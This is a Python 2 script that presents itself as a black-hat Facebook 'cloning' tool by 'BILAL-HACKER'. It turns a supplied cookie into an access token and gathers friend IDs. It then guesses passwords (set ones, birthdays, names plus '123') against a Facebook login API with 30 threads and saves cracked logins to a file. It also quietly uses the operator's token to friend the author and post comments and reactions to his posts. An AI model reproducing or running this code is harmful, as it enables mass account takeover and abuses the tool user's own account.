#!/usr/bin/python
# -*- coding: utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = ['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]']

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0012)


logo = """		
__  __ ____       ____ ___ _        _    _
|  \/  |  _ \     | __ )_ _| |      / \  | |
| |\/| | |_) |____|  _ \| || |     / _ \ | |
| |  | |  _ <_____| |_) | || |___ / ___ \| |___
|_|  |_|_| \_\    |____/___|_____/_/   \_\_____|

💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-BILAL.☕
           💕💕         BILAL-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m──────────────────────────────────────────────────────
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ PAKISTAN BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : BILAL-HACKER
\x1b[1;94m➣       FROM : AZAD KASHMIR
\x1b[1;95m➣   WHATSAPP : +923445440871
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY INDONESIA FOR CLONING
\x1b[1;94m➣    WARNING : USE FAST INTERNER 
\x1b[1;95m➣    WARNING : STAY HOME STAY SAVE
\x1b[1;94m──────────────────────────────────────────────────────""" 

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Currently Logging in\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;92m[01]\x1b[1;97m\x1b[1;96m\x1b[1;92m Login Using Facebook cookies'
    print '\x1b[1;92m[02]\x1b[1;97m\x1b[1;96m\x1b[1;92m Login Using Facebook Token'
    print '\x1b[1;92m[00]\x1b[1;97m\x1b[1;96m\x1b[1;92m Back'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[0;96m[--]\x1b[97m\x1b[0;92m ')
    if msuk == '':
        print '\x1b[1;41;97m!\x1b[0m] Please Fill In Correctly !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        cookie()
    elif msuk == '2' or msuk == '02':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Please Fill In Correctly !'
        pilih_masuk()


def cookie():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\x1a'
    cookie = raw_input('\x1b[0;91m\x1b[0;97m Cookie \x1b[0;91m:\x1b[0;92m ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\x1b[1;97m[\x1b[1;92m\x1a\x1b[1;97m]\x1b[1;92m Login Successfully Please Crack'
    time.sleep(2)
    menu()
    return


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;39m?\x1b[1;97m] \x1b[31;1mToken : \x1b[31;1m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\x1b[1;92mDONT FORGET TO READ BISMILLAH :) ')
        print '\x1b[1;91m[\x1b[1;39m\xe2\x9c\x93\x1b[1;97m]\x1b[1;39m Alhamdulillah Successful Login'
        os.system('xdg-open')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;39m!\x1b[1;97m] \x1b[1;39mToken Wrong !'
        time.sleep(1)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;39m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100041129048948'
    kom = 'Mr.BILAL\xf0\x9f\x98\x98'
    kom = 'Mr.BILAL\xf0\x9f\x98\x8e'
    reac = 'LOVE'
    post = '481555709892060'
    post2 = '481559296558368'
    kom2 = 'Mr.BILAL\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
    kom = 'Mr.BILAL\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
    reac2 = 'ANGRY\xf0\x9f\x98\x98'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] There is no connectioni'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[37;1m> Name \x1b[1;91m: \x1b[31;1m' + nama + '\x1b[1;97m                  '
    print '\x1b[37;1m> ID   \x1b[1;91m: \x1b[31;1m' + id + '\x1b[1;97m              '
    print '\n\x1b[1;91m> 1.\x1b[0m Start Crack....'
    print '\n\x1b[1;93m> 0.\x1b[0m Logout.....            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m> ')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly! '
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        grupsaya()
    elif unikers == '3':
        informasi()
        yahoo()
    elif unikers == '0':
        os.system('clear')
        jalan('Delete tokens')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly!'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m> 1.\x1b[0m \x1b[37;1m Crack from friends list'
    print '\x1b[1;97m> 2.\x1b[0m \x1b[37;1m Crack from Public Id'
    pilih_super()


def pilih_super():
    peak = raw_input('\n\x1b[1;97m> ')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly'
        pilih_super()
    elif peak == '1':
        os.system('clear')
        print logo
        print 1 * '\x1b[1;97m\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\x1b[0m'
        jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[0mTake ID \x1b[0m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2':
        os.system('clear')
        print logo
        print 1 * '\x1b[1;97m\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\x1b[0m'
        idt = raw_input('\x1b[1;97m[+] \x1b[0mEnter friends ID \x1b[0m: \x1b[37;1m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m[+] \x1b[0mFriends name\x1b[0m :\x1b[0m ' + op['name']
        except KeyError:
            print '\x1b[1;97m[!] \x1b[0mFriends not found!'
            raw_input('\n\x1b[1;97m[\x1b[0mBack\x1b[0m]')
            super()

        jalan('\x1b[1;97m[+] \x1b[Take ID \x1b[0m....')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    print '\x1b[1;97m[+] \x1b[0mTotal ID: ' + str(len(id))
    time.sleep(1)
    pw1 = raw_input('\x1b[1;92m[+] \x1b[0m Set Password  :')
    pw2 = raw_input('\x1b[1;92m[+] \x1b[0m Set Password  :')
    pw3 = raw_input('\x1b[1;92m[+] \x1b[0m Set Password  :')
    pw4 = raw_input('\x1b[1;;92m[+] \x1b[0m Set Password  :')
    print '\x1b[1;97m[+] \x1b[0m Running Crack Please Wait\x1b[0m..........'
    time.sleep(4)
    print '\x1b[1;97m[+] \x1b[0m If No Results Use Data / Airplane Mode'
    print 1 * '\x1b[1;97m\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\x1b[0m'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            p1 = pw1
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p1
                cek = open('save/hack.txt', 'a')
                cek.write(user + '|' + p1 + '\n')
                cek.close()
                oks.append(user + p1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[BILAL-CP] ' + user + ' |\x1b[0m ' + p1
                cekpoint.append(user + p1)
            else:
                p2 = pw2
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p2 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p2
                    cekpoint.append(user + p2)
                else:
                    p3 = pw3
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p3 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;41;97m[] ' + user + ' |\x1b[0m ' + p3
                        cek = open('save/hack.txt', 'a')
                        cek.write(user + '|' + p3 + '\n')
                        cek.close()
                        oks.append(user + p3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p3
                        cekpoint.append(user + p3)
                    else:
                        p4 = pw4
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p4 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[BILAL-CP] ' + user + ' |\x1b[0m ' + p4
                            cekpoint.append(user + p4)
                        else:
                            birthday = b['birthday']
                            p5 = birthday.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p5 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p5
                                cekpoint.append(user + p5)
                            else:
                                p6 = b['first_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p6
                                    cekpoint.append(user + p6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                    b = json.load(a.text)
                                    p7 = b['last_name'] + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p7 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[BILAL-HACKED] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[BILAL-CP] ' + user + ' |\x1b[0m ' + p7
                                        cekpoint.append(user + p6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 25 * '-'
    print '\x1b[1;92m[CLONING DONE !'
    print '\x1b[1;92m[HACKED : ' + str(len(oks))
    print '\x1b[1;92m[CHEEK : ' + str(len(cekpoint))
    print '\x1b[1;92m[File save ~> save/hack.txt'
    print 25 * '-'
    print ' Thank you Using My Tools'
    os.sys.exit(0)


if __name__ == '__main__':
    menu()
    masuk()
